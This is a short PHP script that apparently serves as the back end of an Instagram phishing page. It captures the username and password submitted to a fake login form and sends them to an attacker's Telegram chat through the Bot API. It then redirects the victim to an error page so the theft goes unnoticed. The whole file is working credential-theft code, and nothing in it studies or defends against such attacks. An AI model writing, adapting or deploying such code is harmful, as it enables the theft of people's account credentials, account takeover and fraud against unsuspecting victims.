<?php
$botToken = getenv("BOT_TOKEN");
$chatId = getenv("CHAT_ID");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $message = "Instagram Phish:\nUsername: $username\nPassword: $password";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($postData)
        )
    );

    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Optional: Show invalid login page
    header('Location: index.html?error=1');
    exit();
}
?>
